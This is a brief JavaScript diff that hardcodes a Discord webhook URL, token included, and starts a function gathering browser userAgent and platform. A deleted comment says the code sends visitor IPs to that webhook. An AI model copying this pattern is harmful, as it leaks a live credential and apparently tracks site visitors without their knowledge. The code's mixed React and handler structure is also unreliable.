@@ -1,16 +1,9 @@
-export default async function handler(request, response) {
-  if (request.method !== 'POST') {
-    return response.status(405).json({ error: 'Method not allowed' });
-  }
-  
 const { useState, useEffect, useRef, useCallback } = React;
   
 const webhookURL = process.env.NEXT_PUBLIC_WEBHOOK_URL;
 
+const discordWebhookURL = `https://discord.com/api/webhooks/1415162908031189002/5Jh3j-gknvofG8iXc6F5dXtkNrAgK68IKO0Qlgk-qPOj_C69L08M2L8itZtdK6m_ka9J`;
 
-const discordWebhookURL = `${webhookURL}`;
-
-// Function to get visitor IP and send to Discord webhook
 function getDeviceInfo() {
   const ua = navigator.userAgent;
   const platform = navigator.platform;
